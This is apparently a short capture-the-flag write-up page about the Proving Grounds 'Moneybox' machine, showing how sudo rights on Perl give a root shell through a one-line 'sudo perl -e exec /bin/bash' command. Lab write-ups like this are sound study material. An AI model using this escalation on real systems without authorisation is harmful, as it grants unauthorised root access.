---
layout: default
title: Perl
parent: GTFOBins
nav_order: 1
---

# Perl

---

We have sudo privileges for _/usr/bin/perl_

![sudo](../../../../assets/images/ctfs/proving_grounds/moneybox/sudo.png)

![gtfobins](../../../../assets/images/ctfs/proving_grounds/moneybox/gtfobins.png)

Run _perl_ to execute /bin/bash and elevate to a root shell.

```bash
sudo perl -e 'exec "/bin/bash";'
```

![root](../../../../assets/images/ctfs/proving_grounds/moneybox/root.png)
